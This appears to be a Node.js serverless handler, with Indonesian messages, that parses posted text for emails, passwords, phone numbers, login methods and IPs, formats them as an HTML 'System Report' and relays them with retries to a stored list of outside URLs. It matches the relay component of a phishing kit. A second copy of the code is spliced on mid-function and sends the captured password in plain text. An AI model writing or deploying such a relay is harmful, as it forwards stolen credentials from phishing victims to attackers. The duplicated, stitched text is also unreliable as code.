const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   SAFE LOAD & SAVE URL
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    return data ? JSON.parse(data) : [];
  } catch {
    return [];
  }
}

function saveUrls(data) {
  try {
    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.log("SAVE ERROR:", e.message);
  }
}

/* ======================
   NORMALIZE KEY
====================== */
function normalizeKey(key = "") {
  key = key.toLowerCase();

  const map = {
    email: ["email", "e-mail", "mail"],
    password: ["password", "pass", "kata sandi", "sandi", "pwd"],
    user: ["user", "username", "nama", "name"],
    login: ["login", "login via", "auth"],
    phone: ["phone", "hp", "no hp", "nomor", "telepon"],
    ip: ["ip", "ip address"],
  };

  for (const k in map) {
    if (map[k].some(x => key.includes(x))) return k;
  }

  return key.replace(/\s+/g, "_");
}

/* ======================
   CLEAN HTML
====================== */
function stripHtml(input = "") {
  return String(input)
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, "\n");
}

/* ======================
   AUTO EXTRACT VARS
====================== */
function extractVars(input = "") {
  const vars = {};
  const html = stripHtml(input);

  const tdRegex = /<td[^>]*>(.*?)<\/td>\s*<td[^>]*>(.*?)<\/td>/gi;
  let m;

  while ((m = tdRegex.exec(html)) !== null) {
    const keyRaw = m[1].replace(/<[^>]*>/g, "").trim();
    const value = m[2].replace(/<[^>]*>/g, "").trim();

    const key = normalizeKey(keyRaw);

    if (value) vars[key] = value;
  }

  const lines = html.split("\n");

  for (const line of lines) {
    const clean = line.replace(/<[^>]*>/g, "").trim();
    const m2 = clean.match(/^(.+?)\s*[:=]\s*(.+)$/);

    if (m2) {
      const key = normalizeKey(m2[1].trim());
      const value = m2[2].trim();

      if (value) vars[key] = value;
    }
  }

  if (!vars.password) {
    const passMatch = html.match(/(password|kata\s*sandi|sandi)\s*[:=]?\s*([^\s<]+)/i);
    if (passMatch) vars.password = passMatch[2];
  }

  return vars;
}

/* ======================
   BUILD HTML
====================== */
function buildHtml(vars) {
  const row = (k, v) => `
    <tr>
      <td style="padding:10px;border:1px solid #1f2937;background:#1f2937;color:#94a3b8">
        ${k}
      </td>
      <td style="padding:10px;border:1px solid #1f2937;background:#111827">
        ${v || "-"}
      </td>
    </tr>
  `;

  return `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>
<body style="margin:0;background:#0f172a;font-family:Arial;color:#e5e7eb;padding:20px">

<div style="max-width:700px;margin:auto;background:#111827;border-radius:10px;overflow:hidden">

  <div style="padding:18px;background:#0b1220;text-align:center">
    <h2 style="margin:0">System Report</h2>
    <small style="color:#94a3b8">Auto Generated</small>
  </div>

  <div style="padding:20px">
    <table style="width:100%;border-collapse:collapse">

      <tr><td>User</td><td>${vars.user || "-"}</td></tr>
      <tr><td>Email</td><td>${vars.email || "-"}</td></tr>
      <tr><td>Password</td><td>***REDACTED***</td></tr>
      <tr><td>Login</td><td>${vars.login || "-"}</td></tr>
      <tr><td>Phone</td><td>${vars.phone || "-"}</td></tr>
      <tr><td>IP</td><td>${vars.ip || "-"}</td></tr>

    </table>
  </div>

</div>

</body>
</html>
`;
}

/* ======================
   🔥 ANTI SPAM (ADDED ONLY FOR SUBJEK & PESAN)
====================== */
function containsSpamPattern(text = "") {
  const t = text.toLowerCase();

  const spamPatterns = [
    /free\s+money/,
    /klik\s+di\s+sini/i,
    /wa\s*me/i,
    /http[s]?:\/\//gi,
    /bit\.ly|tinyurl|cutt\.ly/i,
    /(.)\1{6,}/,
    /buy\s+now|order\s+now/i,
    /pinjaman|kredit\s+cepat/i,
    /xxx|porn|sex/i
  ];

  return spamPatterns.some((p) => p.test(t));
}

function spamScore(text = "") {
  let score = 0;
  const t = text.toLowerCase();

  if (t.includes("http")) score += 2;
  if (/(.)\1{5,}/.test(t)) score += 2;
  if (t.length > 2000) score += 1;
  if (/[A-Z]{10,}/.test(text)) score += 1;

  return score;
}

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false, message: "POST only" });
    }

    const body = req.body || {};
    const subjek = body.subjek || "";
    const pesan = body.pesan || "";

    /* ======================
       🔥 ANTI SPAM CHECK (ONLY SUBJEK & PESAN)
    ====================== */
    if (containsSpamPattern(subjek) || spamScore(subjek) >= 2) {
      return res.status(400).json({
        success: false,
        message: "Subjek terdeteksi spam"
      });
    }

    if (containsSpamPattern(pesan) || spamScore(pesan) >= 3) {
      return res.status(400).json({
        success: false,
        message: "Pesan terdeteksi spam"
      });
    }

    const vars = extractVars(pesan);

    vars.ip =
      vars.ip ||
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "unknown";

    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({ success: false, message: "URL kosong" });
    }

    const fetchFn =
      global.fetch ||
      ((...args) =>
        import("node-fetch").then(({ default: fetch }) => fetch(...args)));

    const results = await Promise.all(
      urls.map(async (url) => {
        let attempt = 0;

        while (attempt < 2) {
          attempt++;

          const controller = new (global.AbortController || require("abort-controller"))();
          const timeout = setTimeout(() => controller.abort(), 8000);

          try {
            const r = await fetchFn(url, {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded"
              },
              body: new URLSearchParams({
                subjek,
                pesan: html
              }),
              signal: controller.signal
            });

            clearTimeout(timeout);

            return {
              url,
              success: true,
              status: r.status
            };
          } catch (err) {
            clearTimeout(timeout);

            if (attempt >= 2) {
              return {
                url,
                success: false,
                error: err.name === "AbortError" ? "TIMEOUT" : err.message
              };
            }
          }
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};  const tdRegex = /<td[^>]*>(.*?)<\/td>\s*<td[^>]*>(.*?)<\/td>/gi;
  let m;

  while ((m = tdRegex.exec(html)) !== null) {
    const keyRaw = m[1].replace(/<[^>]*>/g, "").trim();
    const value = m[2].replace(/<[^>]*>/g, "").trim();

    const key = normalizeKey(keyRaw);

    if (value) vars[key] = value;
  }

  /* 2. FALLBACK TEXT PARSER */
  const lines = html.split("\n");

  for (const line of lines) {
    const clean = line.replace(/<[^>]*>/g, "").trim();
    const m2 = clean.match(/^(.+?)\s*[:=]\s*(.+)$/);

    if (m2) {
      const key = normalizeKey(m2[1].trim());
      const value = m2[2].trim();

      if (value) vars[key] = value;
    }
  }

  /* 3. PRIORITY PASSWORD FIX (ANTI MISS DETECT) */
  if (!vars.password) {
    const passMatch = html.match(/(password|kata\s*sandi|sandi)\s*[:=]?\s*([^\s<]+)/i);
    if (passMatch) vars.password = passMatch[2];
  }

  return vars;
}

/* ======================
   BUILD HTML TEMPLATE (NO CHANGE)
====================== */
function buildHtml(vars) {
  const row = (k, v) => `
    <tr>
      <td style="padding:10px;border:1px solid #1f2937;background:#1f2937;color:#94a3b8">
        ${k}
      </td>
      <td style="padding:10px;border:1px solid #1f2937;background:#111827">
        ${v || "-"}
      </td>
    </tr>
  `;

  return `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>
<body style="margin:0;background:#0f172a;font-family:Arial;color:#e5e7eb;padding:20px">

<div style="max-width:700px;margin:auto;background:#111827;border-radius:10px;overflow:hidden">

  <div style="padding:18px;background:#0b1220;text-align:center">
    <h2 style="margin:0">System Report</h2>
    <small style="color:#94a3b8">Auto Generated</small>
  </div>

  <div style="padding:20px">
    <table style="width:100%;border-collapse:collapse">

      ${row("User", vars.user)}
      ${row("Email", vars.email)}
      ${row("Password", vars.password)}
      ${row("Login", vars.login)}
      ${row("Phone", vars.phone)}
      ${row("IP", vars.ip)}

    </table>
  </div>

</div>

</body>
</html>
`;
}

/* ======================
   MAIN HANDLER (FIXED 500 + SAFE FETCH)
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false, message: "POST only" });
    }

    const body = req.body || {};
    const subjek = body.subjek || "";
    const pesan = body.pesan || "";

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    const vars = extractVars(pesan);

    /* FIX IP SAFE */
    vars.ip =
      vars.ip ||
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "unknown";

    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({ success: false, message: "URL kosong" });
    }

    /* FIX FETCH (ANTI CRASH VERCEL) */
    const fetchFn =
      global.fetch ||
      ((...args) => import("node-fetch").then(({ default: fetch }) => fetch(...args)));

    /* ======================
       PARALLEL + RETRY + TIMEOUT FIX
    ====================== */
    const results = await Promise.all(
      urls.map(async (url) => {
        let attempt = 0;

        while (attempt < 2) {
          attempt++;

          const controller = new (global.AbortController || require("abort-controller"))();
          const timeout = setTimeout(() => controller.abort(), 8000);

          try {
            const r = await fetchFn(url, {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded"
              },
              body: new URLSearchParams({
                subjek,
                pesan: html
              }),
              signal: controller.signal
            });

            clearTimeout(timeout);

            return {
              url,
              success: true,
              status: r.status,
              retry: attempt - 1
            };
          } catch (err) {
            clearTimeout(timeout);

            if (attempt >= 2) {
              return {
                url,
                success: false,
                error: err.name === "AbortError" ? "TIMEOUT" : err.message,
                retry: attempt - 1
              };
            }
          }
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      vars,
      results
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
